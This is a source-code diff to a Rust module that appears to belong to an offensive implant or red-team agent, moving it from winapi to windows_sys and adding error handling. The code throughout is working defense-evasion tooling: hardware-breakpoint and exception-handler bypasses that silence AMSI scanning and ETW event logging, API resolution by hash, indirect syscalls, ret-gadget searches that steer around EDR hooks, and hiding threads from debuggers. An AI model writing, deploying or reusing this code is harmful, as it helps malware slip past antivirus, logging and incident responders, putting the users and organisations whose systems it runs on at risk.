@@ -14,6 +14,8 @@
 #[cfg(windows)]
 use std::sync::atomic::{AtomicUsize, Ordering};
 
+use anyhow::{anyhow, Result};
+
 #[cfg(windows)]
 static AMSI_ADDR: AtomicUsize = AtomicUsize::new(0);
 #[cfg(windows)]
@@ -26,18 +28,18 @@ static ETW_ADDR: AtomicUsize = AtomicUsize::new(0);
 static RET_GADGET: AtomicUsize = AtomicUsize::new(0);
 
 #[cfg(all(windows, target_arch = "x86_64"))]
-unsafe fn context_ip(context: *mut winapi::um::winnt::CONTEXT) -> usize {
+unsafe fn context_ip(context: *mut windows_sys::Win32::System::Diagnostics::Debug::CONTEXT) -> usize {
     (*context).Rip as usize
 }
 
 #[cfg(all(windows, target_arch = "aarch64"))]
-unsafe fn context_ip(context: *mut winapi::um::winnt::CONTEXT) -> usize {
+unsafe fn context_ip(context: *mut windows_sys::Win32::System::Diagnostics::Debug::CONTEXT) -> usize {
     (*context).Pc as usize
 }
 
 #[cfg(all(windows, target_arch = "x86_64"))]
 unsafe fn context_set_return_success_and_redirect(
-    context: *mut winapi::um::winnt::CONTEXT,
+    context: *mut windows_sys::Win32::System::Diagnostics::Debug::CONTEXT,
     gadget: usize,
 ) {
     (*context).Rax = 0;
@@ -46,22 +48,22 @@ unsafe fn context_set_return_success_and_redirect(
 
 #[cfg(all(windows, target_arch = "aarch64"))]
 unsafe fn context_set_return_success_and_redirect(
-    context: *mut winapi::um::winnt::CONTEXT,
+    context: *mut windows_sys::Win32::System::Diagnostics::Debug::CONTEXT,
     gadget: usize,
 ) {
-    (*context).u.s_mut().X0 = 0;
+    (*context).Anonymous.s_mut().X0 = 0;
     (*context).Pc = gadget as u64;
 }
 
 #[cfg(all(windows, target_arch = "x86_64"))]
-fn hwbp_set_slots(ctx: &mut winapi::um::winnt::CONTEXT, amsi: usize, etw: usize) {
+fn hwbp_set_slots(ctx: &mut crate::win_types::CONTEXT, amsi: usize, etw: usize) {
     ctx.Dr0 = amsi as u64;
     ctx.Dr1 = etw as u64;
     ctx.Dr7 |= (1 << 0) | (1 << 2);
 }
 
 #[cfg(all(windows, target_arch = "aarch64"))]
-fn hwbp_set_slots(ctx: &mut winapi::um::winnt::CONTEXT, amsi: usize, etw: usize) {
+fn hwbp_set_slots(ctx: &mut crate::win_types::CONTEXT, amsi: usize, etw: usize) {
     const ARM64_BCR_EL0_EXECUTE: u32 = 0x5;
     ctx.Bvr[0] = amsi as u64;
     ctx.Bvr[1] = etw as u64;
@@ -71,8 +73,8 @@ fn hwbp_set_slots(ctx: &mut winapi::um::winnt::CONTEXT, amsi: usize, etw: usize)
 
 #[cfg(all(windows, target_arch = "x86_64"))]
 fn hwbp_slots_match(
-    actual: &winapi::um::winnt::CONTEXT,
-    expected: &winapi::um::winnt::CONTEXT,
+    actual: &crate::win_types::CONTEXT,
+    expected: &crate::win_types::CONTEXT,
 ) -> bool {
     actual.Dr0 == expected.Dr0
         && actual.Dr1 == expected.Dr1
@@ -81,8 +83,8 @@ fn hwbp_slots_match(
 
 #[cfg(all(windows, target_arch = "aarch64"))]
 fn hwbp_slots_match(
-    actual: &winapi::um::winnt::CONTEXT,
-    expected: &winapi::um::winnt::CONTEXT,
+    actual: &crate::win_types::CONTEXT,
+    expected: &crate::win_types::CONTEXT,
 ) -> bool {
     actual.Bvr[0] == expected.Bvr[0]
         && actual.Bvr[1] == expected.Bvr[1]
@@ -91,17 +93,17 @@ fn hwbp_slots_match(
 }
 
 #[cfg(all(windows, target_arch = "x86_64"))]
-fn hwbp_slot_values(ctx: &winapi::um::winnt::CONTEXT) -> (u64, u64) {
+fn hwbp_slot_values(ctx: &crate::win_types::CONTEXT) -> (u64, u64) {
     (ctx.Dr0, ctx.Dr1)
 }
 
 #[cfg(all(windows, target_arch = "aarch64"))]
-fn hwbp_slot_values(ctx: &winapi::um::winnt::CONTEXT) -> (u64, u64) {
+fn hwbp_slot_values(ctx: &crate::win_types::CONTEXT) -> (u64, u64) {
     (ctx.Bvr[0], ctx.Bvr[1])
 }
 
 #[cfg(all(windows, target_arch = "x86_64"))]
-fn hwbp_clear_if_owned(ctx: &mut winapi::um::winnt::CONTEXT, amsi: usize, etw: usize) {
+fn hwbp_clear_if_owned(ctx: &mut crate::win_types::CONTEXT, amsi: usize, etw: usize) {
     if (ctx.Dr0 == amsi as u64) || (ctx.Dr1 == etw as u64) {
         ctx.Dr0 = 0;
         ctx.Dr1 = 0;
@@ -110,7 +112,7 @@ fn hwbp_clear_if_owned(ctx: &mut winapi::um::winnt::CONTEXT, amsi: usize, etw: u
 }
 
 #[cfg(all(windows, target_arch = "aarch64"))]
-fn hwbp_clear_if_owned(ctx: &mut winapi::um::winnt::CONTEXT, amsi: usize, etw: usize) {
+fn hwbp_clear_if_owned(ctx: &mut crate::win_types::CONTEXT, amsi: usize, etw: usize) {
     if (ctx.Bvr[0] == amsi as u64) || (ctx.Bvr[1] == etw as u64) {
         ctx.Bvr[0] = 0;
         ctx.Bvr[1] = 0;
@@ -120,7 +122,7 @@ fn hwbp_clear_if_owned(ctx: &mut winapi::um::winnt::CONTEXT, amsi: usize, etw: u
 }
 
 #[cfg(all(windows, target_arch = "x86_64"))]
-fn hwbp_restore_slots(ctx: &mut winapi::um::winnt::CONTEXT, saved: &SavedDebugRegs) {
+fn hwbp_restore_slots(ctx: &mut crate::win_types::CONTEXT, saved: &SavedDebugRegs) {
     ctx.Dr0 = saved.dr0;
     ctx.Dr1 = saved.dr1;
     if saved.dr0 != 0 {
@@ -132,7 +134,7 @@ fn hwbp_restore_slots(ctx: &mut winapi::um::winnt::CONTEXT, saved: &SavedDebugRe
 }
 
 #[cfg(all(windows, target_arch = "aarch64"))]
-fn hwbp_restore_slots(ctx: &mut winapi::um::winnt::CONTEXT, saved: &SavedDebugRegs) {
+fn hwbp_restore_slots(ctx: &mut crate::win_types::CONTEXT, saved: &SavedDebugRegs) {
     const ARM64_BCR_EL0_EXECUTE: u32 = 0x5;
     ctx.Bvr[0] = saved.dr0;
     ctx.Bvr[1] = saved.dr1;
@@ -156,15 +158,15 @@ static VEH_HANDLE: AtomicUsize = AtomicUsize::new(0);
 
 #[cfg(windows)]
 unsafe extern "system" fn veh_handler(
-    exception_info: *mut winapi::um::winnt::EXCEPTION_POINTERS,
+    exception_info: *mut windows_sys::Win32::System::Diagnostics::Debug::EXCEPTION_POINTERS,
 ) -> i32 {
     let record = (*exception_info).ExceptionRecord;
     let context = (*exception_info).ContextRecord;
 
-    if (*record).ExceptionCode == winapi::um::winnt::STATUS_SINGLE_STEP {
+    if (*record).ExceptionCode == windows_sys::Win32::Foundation::STATUS_SINGLE_STEP {
         let ip = context_ip(context);
-        let amsi = AMSI_ADDR.load(Ordering::Relaxed);
-        let etw = ETW_ADDR.load(Ordering::Relaxed);
+        let amsi = AMSI_ADDR.load(Ordering::Acquire);
+        let etw = ETW_ADDR.load(Ordering::Acquire);
 
         if (amsi != 0 && ip == amsi) || (etw != 0 && ip == etw) {
             // Bypass by clearing the ABI return register and advancing IP to a
@@ -173,23 +175,23 @@ unsafe extern "system" fn veh_handler(
             // before this handler was registered.  Scanning memory or calling
             // NtQueryVirtualMemory here would risk deadlock (loader-lock / heap-lock
             // contention inside a VEH handler).
-            let gadget = RET_GADGET.load(Ordering::Relaxed);
+            let gadget = RET_GADGET.load(Ordering::Acquire);
             if gadget == 0 {
                 // Gadget was not resolved at setup time; propagate the exception.
-                return winapi::vc::excpt::EXCEPTION_CONTINUE_SEARCH;
+                return windows_sys::Win32::System::Diagnostics::Debug::EXCEPTION_CONTINUE_SEARCH;
             }
             context_set_return_success_and_redirect(context, gadget);
-            return winapi::vc::excpt::EXCEPTION_CONTINUE_EXECUTION;
+            return windows_sys::Win32::System::Diagnostics::Debug::EXCEPTION_CONTINUE_EXECUTION;
         }
     }
-    winapi::vc::excpt::EXCEPTION_CONTINUE_SEARCH
+    windows_sys::Win32::System::Diagnostics::Debug::EXCEPTION_CONTINUE_SEARCH
 }
 
 #[cfg(windows)]
 pub unsafe fn setup_hardware_breakpoints() {
-    use winapi::um::handleapi::INVALID_HANDLE_VALUE;
-    use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS};
-
+    use crate::win_types::INVALID_HANDLE_VALUE;
+    use crate::win_types::CONTEXT;
+    use crate::win_types::CONTEXT_DEBUG_REGISTERS;
     /// Minimal thread access for hardware breakpoints: THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_LIMITED_INFORMATION.
     const THREAD_BP_ACCESS: u64 = 0x1A02;
 
@@ -200,7 +202,7 @@ pub unsafe fn setup_hardware_breakpoints() {
 
     type AddVehFn = unsafe extern "system" fn(
         u32,
-        Option<unsafe extern "system" fn(*mut winapi::um::winnt::EXCEPTION_POINTERS) -> i32>,
+        Option<unsafe extern "system" fn(*mut windows_sys::Win32::System::Diagnostics::Debug::EXCEPTION_POINTERS) -> i32>,
     ) -> *mut std::ffi::c_void;
 
     let add_veh: Option<AddVehFn> = (|| unsafe {
@@ -210,14 +212,14 @@ pub unsafe fn setup_hardware_breakpoints() {
         Some(std::mem::transmute::<usize, AddVehFn>(addr))
     })();
 
-    type CreateSnapshotFn = unsafe extern "system" fn(u32, u32) -> winapi::um::winnt::HANDLE;
+    type CreateSnapshotFn = unsafe extern "system" fn(u32, u32) -> crate::win_types::HANDLE;
     type Thread32FirstFn = unsafe extern "system" fn(
-        winapi::um::winnt::HANDLE,
-        *mut winapi::um::tlhelp32::THREADENTRY32,
+        crate::win_types::HANDLE,
+        *mut windows_sys::Win32::System::Diagnostics::ToolHelp::THREADENTRY32,
     ) -> i32;
     type Thread32NextFn = unsafe extern "system" fn(
-        winapi::um::winnt::HANDLE,
-        *mut winapi::um::tlhelp32::THREADENTRY32,
+        crate::win_types::HANDLE,
+        *mut windows_sys::Win32::System::Diagnostics::ToolHelp::THREADENTRY32,
     ) -> i32;
 
     let (create_snapshot, thread32_first, thread32_next): (
@@ -243,48 +245,48 @@ pub unsafe fn setup_hardware_breakpoints() {
     };
 
     type NtGetContextThreadFn =
-        unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
+        unsafe extern "system" fn(crate::win_types::HANDLE, *mut CONTEXT) -> i32;
     type NtSetContextThreadFn =
-        unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
+        unsafe extern "system" fn(crate::win_types::HANDLE, *mut CONTEXT) -> i32;
 
     let mut nt_get_context_thread: Option<NtGetContextThreadFn> = None;
     let mut nt_set_context_thread: Option<NtSetContextThreadFn> = None;
 
     let mut configured = false;
 
-    let amsi: *mut winapi::ctypes::c_void =
+    let amsi: *mut std::ffi::c_void =
         pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_AMSI_DLL).unwrap_or(0) as *mut _;
     if !amsi.is_null() {
-        let addr: *mut winapi::ctypes::c_void =
+        let addr: *mut std::ffi::c_void =
             pe_resolve::get_proc_address_by_hash(amsi as usize, pe_resolve::HASH_AMSISCANBUFFER)
                 .unwrap_or(0) as *mut _;
         if !addr.is_null() {
-            AMSI_ADDR.store(addr as usize, Ordering::Relaxed);
+            AMSI_ADDR.store(addr as usize, Ordering::Release);
             configured = true;
         }
     }
 
-    let ntdll: *mut winapi::ctypes::c_void =
+    let ntdll: *mut std::ffi::c_void =
         pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as *mut _;
     if !ntdll.is_null() {
-        let addr: *mut winapi::ctypes::c_void =
+        let addr: *mut std::ffi::c_void =
             pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_ETWEVENTWRITE)
                 .unwrap_or(0) as *mut _;
         if !addr.is_null() {
-            ETW_ADDR.store(addr as usize, Ordering::Relaxed);
+            ETW_ADDR.store(addr as usize, Ordering::Release);
             configured = true;
         }
 
         let nt_get_hash = pe_resolve::hash_str(b"NtGetContextThread\0");
         let nt_set_hash = pe_resolve::hash_str(b"NtSetContextThread\0");
 
-        let nt_get_addr: *mut winapi::ctypes::c_void =
+        let nt_get_addr: *mut std::ffi::c_void =
             pe_resolve::get_proc_address_by_hash(ntdll as usize, nt_get_hash).unwrap_or(0) as _;
         if !nt_get_addr.is_null() {
             nt_get_context_thread = Some(std::mem::transmute(nt_get_addr));
         }
 
-        let nt_set_addr: *mut winapi::ctypes::c_void =
+        let nt_set_addr: *mut std::ffi::c_void =
             pe_resolve::get_proc_address_by_hash(ntdll as usize, nt_set_hash).unwrap_or(0) as _;
         if !nt_set_addr.is_null() {
             nt_set_context_thread = Some(std::mem::transmute(nt_set_addr));
@@ -294,10 +296,14 @@ pub unsafe fn setup_hardware_breakpoints() {
         // needs to scan memory or call NtQueryVirtualMemory at exception time.
         // NtQueryVirtualMemory is safe here (not inside a VEH handler).
         'gadget: {
-            use winapi::um::winnt::{
-                IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, MEMORY_BASIC_INFORMATION, MEM_COMMIT,
-                PAGE_EXECUTE_READ,
-            };
+            use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64};
+            use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
+            use windows_sys::Win32::System::Memory::{MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_WRITECOPY};
+            use crate::win_types::PAGE_EXECUTE_READWRITE;
+
+            /// Bitmask covering all protection flags that grant execute permission.
+            const ANY_EXECUTE: u32 =
+                PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY;
 
             // Compute ntdll's address range for gadget validation.
             let ntdll_base = ntdll as usize;
@@ -382,9 +388,9 @@ pub unsafe fn setup_hardware_breakpoints() {
                     if vq_status.is_err() || vq_status.unwrap() < 0 || mbi.State != MEM_COMMIT {
                         break 'gadget;
                     }
-                    // Require at least PAGE_EXECUTE_READ.
+                    // Require execute permission on the page.
                     let prot = mbi.Protect & 0xFF; // mask off guard/nocache modifiers
-                    if prot < PAGE_EXECUTE_READ {
+                    if (prot & ANY_EXECUTE) == 0 {
                         break 'gadget;
                     }
                     last_page = page;
@@ -398,12 +404,12 @@ pub unsafe fn setup_hardware_breakpoints() {
                         // A hooked NtClose may redirect us to EDR memory where a
                         // ret gadget would be a strong detection signal.
                         if ntdll_end > 0 && (addr < ntdll_base || addr >= ntdll_end) {
-                            log::warn!("evasion: ret gadget at {:#x} is outside ntdll range [{:#x},{:#x}) — possible EDR hook, skipping", addr, ntdll_base, ntdll_end);
+                            tracing::warn!("evasion: ret gadget at {:#x} is outside ntdll range [{:#x},{:#x}) — possible EDR hook, skipping", addr, ntdll_base, ntdll_end);
                             p = p.add(1);
                             continue;
                         }
-                        RET_GADGET.store(addr, Ordering::Relaxed);
-                        log::debug!("evasion: ret gadget pre-computed at {:#x}", addr);
+                        RET_GADGET.store(addr, Ordering::Release);
+                        tracing::debug!("evasion: ret gadget pre-computed at {:#x}", addr);
                         break 'gadget;
                     }
 
@@ -412,12 +418,12 @@ pub unsafe fn setup_hardware_breakpoints() {
                         if addr + 3 <= (page + 0x1000) {
                             // Validate the gadget is within ntdll's address range.
                             if ntdll_end > 0 && (addr < ntdll_base || addr >= ntdll_end) {
-                                log::warn!("evasion: ret-N gadget at {:#x} is outside ntdll range [{:#x},{:#x}) — possible EDR hook, skipping", addr, ntdll_base, ntdll_end);
+                                tracing::warn!("evasion: ret-N gadget at {:#x} is outside ntdll range [{:#x},{:#x}) — possible EDR hook, skipping", addr, ntdll_base, ntdll_end);
                                 p = p.add(1);
                                 continue;
                             }
-                            RET_GADGET.store(addr, Ordering::Relaxed);
-                            log::debug!("evasion: ret-N gadget pre-computed at {:#x}", addr);
+                            RET_GADGET.store(addr, Ordering::Release);
+                            tracing::debug!("evasion: ret-N gadget pre-computed at {:#x}", addr);
                         }
                         break 'gadget;
                     }
@@ -431,12 +437,12 @@ pub unsafe fn setup_hardware_breakpoints() {
                         let insn = std::ptr::read_unaligned(p as *const u32);
                         if insn == 0xD65F_03C0 {
                             if ntdll_end > 0 && (addr < ntdll_base || addr >= ntdll_end) {
-                                log::warn!("evasion: ARM64 ret gadget at {:#x} is outside ntdll range [{:#x},{:#x}) — possible EDR hook, skipping", addr, ntdll_base, ntdll_end);
+                                tracing::warn!("evasion: ARM64 ret gadget at {:#x} is outside ntdll range [{:#x},{:#x}) — possible EDR hook, skipping", addr, ntdll_base, ntdll_end);
                                 p = p.add(4);
                                 continue;
                             }
-                            RET_GADGET.store(addr, Ordering::Relaxed);
-                            log::debug!("evasion: ARM64 ret gadget pre-computed at {:#x}", addr);
+                            RET_GADGET.store(addr, Ordering::Release);
+                            tracing::debug!("evasion: ARM64 ret gadget pre-computed at {:#x}", addr);
                             break 'gadget;
                         }
                     }
@@ -452,7 +458,7 @@ pub unsafe fn setup_hardware_breakpoints() {
 
             // Fallback: if no valid ntdll ret gadget was found, resolve
             // RtlGetCurrentPeb which always ends with a `ret`.
-            if RET_GADGET.load(Ordering::Relaxed) == 0 {
+            if RET_GADGET.load(Ordering::Acquire) == 0 {
                 let peb_fn = pe_resolve::get_proc_address_by_hash(
                     ntdll_base,
                     pe_resolve::hash_str(b"RtlGetCurrentPeb\0"),
@@ -474,8 +480,8 @@ pub unsafe fn setup_hardware_breakpoints() {
                             let gadget = peb_fn + i;
                             // Verify it's within ntdll (should always be).
                             if ntdll_end == 0 || (gadget >= ntdll_base && gadget < ntdll_end) {
-                                RET_GADGET.store(gadget, Ordering::Relaxed);
-                                log::debug!(
+                                RET_GADGET.store(gadget, Ordering::Release);
+                                tracing::debug!(
                                     "evasion: ret gadget fallback from RtlGetCurrentPeb at {:#x}",
                                     gadget
                                 );
@@ -489,10 +495,10 @@ pub unsafe fn setup_hardware_breakpoints() {
     }
 
     if nt_set_context_thread.is_some() {
-        log::debug!("evasion: using NtSetContextThread for debug register modification");
+        tracing::debug!("evasion: using NtSetContextThread for debug register modification");
     } else {
-        log::debug!("evasion: NtSetContextThread not available, falling back to SetThreadContext");
-        log::warn!(
+        tracing::debug!("evasion: NtSetContextThread not available, falling back to SetThreadContext");
+        tracing::warn!(
             "evasion: SetThreadContext fallback path in use for debug register modification"
         );
     }
@@ -533,16 +539,16 @@ pub unsafe fn setup_hardware_breakpoints() {
     // TH32CS_SNAPTHREAD = 0x00000004
     let snapshot = create_snapshot.map_or(INVALID_HANDLE_VALUE, |f| f(0x00000004, 0));
     if snapshot != INVALID_HANDLE_VALUE {
-        let mut te32: winapi::um::tlhelp32::THREADENTRY32 = std::mem::zeroed();
-        te32.dwSize = std::mem::size_of::<winapi::um::tlhelp32::THREADENTRY32>() as u32;
+        let mut te32: windows_sys::Win32::System::Diagnostics::ToolHelp::THREADENTRY32 = std::mem::zeroed();
+        te32.dwSize = std::mem::size_of::<windows_sys::Win32::System::Diagnostics::ToolHelp::THREADENTRY32>() as u32;
 
         if thread32_first.map_or(0, |f| f(snapshot, &mut te32)) != 0 {
             loop {
                 if te32.th32OwnerProcessID == pid {
                     // OpenThread → NtOpenThread (indirect syscall)
-                    let mut oa: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
+                    let mut oa: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
                     oa.Length =
-                        std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+                        std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
                     let mut cid: [u64; 2] = [pid as u64, te32.th32ThreadID as u64];
                     let mut h_thread: usize = 0;
                     let open_ok = crate::syscall!(
@@ -552,7 +558,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                         &mut oa as *mut _ as u64,
                         cid.as_mut_ptr() as u64,
                     );
-                    let h_thread = h_thread as winapi::um::winnt::HANDLE;
+                    let h_thread = h_thread as crate::win_types::HANDLE;
                     if open_ok.is_ok() && open_ok.unwrap() >= 0 && !h_thread.is_null() {
                         // (1) SuspendThread → NtSuspendThread
                         let mut prev_suspend: u32 = 0;
@@ -562,7 +568,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                             &mut prev_suspend as *mut u32 as u64,
                         );
                         if susp_status.is_err() || susp_status.unwrap() < 0 {
-                            log::warn!(
+                            tracing::warn!(
                                 "evasion: NtSuspendThread failed for tid {} — skipping context modification",
                                 te32.th32ThreadID
                             );
@@ -611,7 +617,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                             if status >= 0 {
                                 true
                             } else {
-                                log::warn!(
+                                tracing::warn!(
                                         "evasion: NtGetContextThread failed for tid {} (status=0x{:08x}), falling back to syscall",
                                         te32.th32ThreadID,
                                         status as u32
@@ -623,7 +629,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                         };
 
                         if !got_context {
-                            log::warn!(
+                            tracing::warn!(
                                 "evasion: GetThreadContext failed for tid {} — restoring suspension and skipping",
                                 te32.th32ThreadID
                             );
@@ -638,8 +644,8 @@ pub unsafe fn setup_hardware_breakpoints() {
 
                         hwbp_set_slots(
                             &mut ctx,
-                            AMSI_ADDR.load(Ordering::Relaxed),
-                            ETW_ADDR.load(Ordering::Relaxed),
+                            AMSI_ADDR.load(Ordering::Acquire),
+                            ETW_ADDR.load(Ordering::Acquire),
                         );
 
                         let set_fallback = {
@@ -653,7 +659,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                         let set_ok = if let Some(nt_set_ctx) = nt_set_context_thread {
                             let status = nt_set_ctx(h_thread, &mut ctx);
                             if status < 0 {
-                                log::warn!(
+                                tracing::warn!(
                                         "evasion: NtSetContextThread failed for tid {} (status=0x{:08x}), falling back to syscall",
                                         te32.th32ThreadID,
                                         status as u32
@@ -692,7 +698,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                             if !verify_ok || !hwbp_slots_match(&verify_ctx, &ctx) {
                                 let (actual0, actual1) = hwbp_slot_values(&verify_ctx);
                                 let (expected0, expected1) = hwbp_slot_values(&ctx);
-                                log::warn!(
+                                tracing::warn!(
                                     "evasion: SetThreadContext verification failed for tid {} — HWBP0={:#x} (expected {:#x}), HWBP1={:#x} (expected {:#x}), restoring original context",
                                     te32.th32ThreadID,
                                     actual0, expected0,
@@ -717,7 +723,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                                 }
                             }
                         } else {
-                            log::warn!(
+                            tracing::warn!(
                                 "evasion: SetThreadContext failed for tid {} — debug registers not modified",
                                 te32.th32ThreadID
                             );
@@ -727,7 +733,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                         let resume_status =
                             crate::syscall!("NtResumeThread", h_thread as u64, 0u64);
                         if resume_status.is_err() || resume_status.unwrap() < 0 {
-                            log::error!(
+                            tracing::error!(
                                 "evasion: NtResumeThread failed for tid {} — thread may be left in suspended state!",
                                 te32.th32ThreadID
                             );
@@ -756,6 +762,27 @@ pub unsafe fn patch_amsi() {
 /// No-op stub on non-Windows; always safe to call.
 pub unsafe fn patch_amsi() {}
 
+/// Wrapper around [`setup_hardware_breakpoints`] that returns a `Result`
+/// indicating whether the HWBP bypass was successfully applied.
+///
+/// Returns `Ok(())` if at least one target address (AMSI or ETW) was resolved
+/// and hardware breakpoints were configured.  Returns `Err` if no target
+/// addresses could be resolved (i.e. neither amsi.dll nor EtwEventWrite were
+/// found in the process).
+#[cfg(windows)]
+unsafe fn setup_hardware_breakpoints_result() -> Result<()> {
+    setup_hardware_breakpoints();
+    let amsi = AMSI_ADDR.load(Ordering::Acquire);
+    let etw = ETW_ADDR.load(Ordering::Acquire);
+    if amsi == 0 && etw == 0 {
+        Err(anyhow!(
+            "HWBP ETW/AMSI bypass failed: neither amsi.dll nor EtwEventWrite could be resolved"
+        ))
+    } else {
+        Ok(())
+    }
+}
+
 /// Apply the ETW bypass using the method and mode configured in the agent config.
 ///
 /// Defaults to [`common::config::EtwPatchMethod::Direct`] when `method` is
@@ -768,6 +795,11 @@ pub unsafe fn patch_amsi() {}
 /// `mode` controls whether the direct-patch is applied on newer Windows builds
 /// (see [`common::config::EtwPatchMode`]).  Defaults to `Safe` when `None`.
 ///
+/// # Returns
+///
+/// `Ok(())` when the selected method succeeded, or `Err` describing why every
+/// attempted path failed (including fallbacks).
+///
 /// # Safety
 ///
 /// Modifies process state; see [`crate::etw_patch::patch_etw`] and
@@ -775,18 +807,23 @@ pub unsafe fn patch_amsi() {}
 pub unsafe fn setup_etw_patch(
     method: Option<&common::config::EtwPatchMethod>,
     mode: Option<&common::config::EtwPatchMode>,
-) {
+) -> Result<()> {
     use common::config::EtwPatchMethod;
     let mode = mode.cloned().unwrap_or_default();
     match method.unwrap_or(&EtwPatchMethod::Direct) {
         EtwPatchMethod::Direct => {
-            if let Err(e) = crate::etw_patch::patch_etw_with_mode(mode) {
-                log::warn!("etw_patch: direct patch failed: {}", e);
-            }
+            crate::etw_patch::patch_etw_with_mode(mode)
+                .map_err(|e| anyhow::anyhow!("direct ETW patch failed: {}", e))
         }
         EtwPatchMethod::Hwbp => {
             #[cfg(windows)]
-            setup_hardware_breakpoints();
+            {
+                setup_hardware_breakpoints_result()
+            }
+            #[cfg(not(windows))]
+            {
+                Err(anyhow::anyhow!("Hwbp ETW bypass not available on non-Windows"))
+            }
         }
         EtwPatchMethod::HwBpHook => {
             // General-purpose hw-bp-hook framework (invisible hooks via Dr0–Dr3).
@@ -795,20 +832,19 @@ pub unsafe fn setup_etw_patch(
             #[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
             {
                 if crate::hw_bp_hook::install_etw_bypass() {
-                    log::debug!("etw_patch: hw-bp-hook ETW bypass installed");
+                    tracing::debug!("etw_patch: hw-bp-hook ETW bypass installed");
+                    Ok(())
                 } else {
-                    log::warn!("etw_patch: hw-bp-hook ETW bypass failed; falling back to direct patch");
-                    if let Err(e) = crate::etw_patch::patch_etw_with_mode(mode) {
-                        log::warn!("etw_patch: direct patch fallback also failed: {}", e);
-                    }
+                    tracing::warn!("etw_patch: hw-bp-hook ETW bypass failed; falling back to direct patch");
+                    crate::etw_patch::patch_etw_with_mode(mode)
+                        .map_err(|e| anyhow::anyhow!("hw-bp-hook failed and direct patch fallback also failed: {}", e))
                 }
             }
             #[cfg(not(all(windows, feature = "hw-bp-hook", target_arch = "x86_64")))]
             {
-                log::warn!("etw_patch: HwBpHook method requested but hw-bp-hook feature not compiled; falling back to direct patch");
-                if let Err(e) = crate::etw_patch::patch_etw_with_mode(mode) {
-                    log::warn!("etw_patch: direct patch fallback failed: {}", e);
-                }
+                tracing::warn!("etw_patch: HwBpHook method requested but hw-bp-hook feature not compiled; falling back to direct patch");
+                crate::etw_patch::patch_etw_with_mode(mode)
+                    .map_err(|e| anyhow::anyhow!("hw-bp-hook feature not compiled and direct patch fallback failed: {}", e))
             }
         }
     }
@@ -817,23 +853,23 @@ pub unsafe fn setup_etw_patch(
 #[cfg(windows)]
 pub fn hide_current_thread() {
     unsafe {
-        let ntdll: *mut winapi::ctypes::c_void =
+        let ntdll: *mut std::ffi::c_void =
             pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as _;
         if !ntdll.is_null() {
-            let func: *mut winapi::ctypes::c_void = pe_resolve::get_proc_address_by_hash(
+            let func: *mut std::ffi::c_void = pe_resolve::get_proc_address_by_hash(
                 ntdll as usize,
                 pe_resolve::HASH_NTSETINFORMATIONTHREAD,
             )
             .unwrap_or(0) as _;
             if !func.is_null() {
                 let nt_set_info_thread: extern "system" fn(
-                    winapi::um::winnt::HANDLE,
+                    crate::win_types::HANDLE,
                     u32,
-                    *mut winapi::ctypes::c_void,
+                    *mut std::ffi::c_void,
                     u32,
                 ) -> i32 = std::mem::transmute(func);
                 nt_set_info_thread(
-                    -2isize as winapi::um::winnt::HANDLE, // GetCurrentThread()
+                    -2isize as crate::win_types::HANDLE, // GetCurrentThread()
                     0x11,                                 // ThreadHideFromDebugger
                     std::ptr::null_mut(),
                     0,
@@ -851,10 +887,10 @@ pub fn hide_current_thread() {}
 /// any other thread that must also be covered by the HWBP bypass.
 #[cfg(windows)]
 pub unsafe fn apply_hwbp_to_current_thread() {
-    use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS};
-
-    let amsi = AMSI_ADDR.load(Ordering::Relaxed);
-    let etw = ETW_ADDR.load(Ordering::Relaxed);
+    use crate::win_types::CONTEXT;
+    use crate::win_types::CONTEXT_DEBUG_REGISTERS;
+    let amsi = AMSI_ADDR.load(Ordering::Acquire);
+    let etw = ETW_ADDR.load(Ordering::Acquire);
     if amsi == 0 && etw == 0 {
         return; // HWBPs not yet configured; skip silently
     }
@@ -862,9 +898,9 @@ pub unsafe fn apply_hwbp_to_current_thread() {
     // Resolve Nt* context variants from ntdll via PEB walk to reduce
     // visibility (same pattern as setup_hardware_breakpoints).
     type NtGetContextThreadFn =
-        unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
+        unsafe extern "system" fn(crate::win_types::HANDLE, *mut CONTEXT) -> i32;
     type NtSetContextThreadFn =
-        unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
+        unsafe extern "system" fn(crate::win_types::HANDLE, *mut CONTEXT) -> i32;
 
     let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0);
     let nt_get_ctx: Option<NtGetContextThreadFn> = if ntdll != 0 {
@@ -881,13 +917,13 @@ pub unsafe fn apply_hwbp_to_current_thread() {
     };
 
     if nt_set_ctx.is_none() {
-        log::warn!(
+        tracing::warn!(
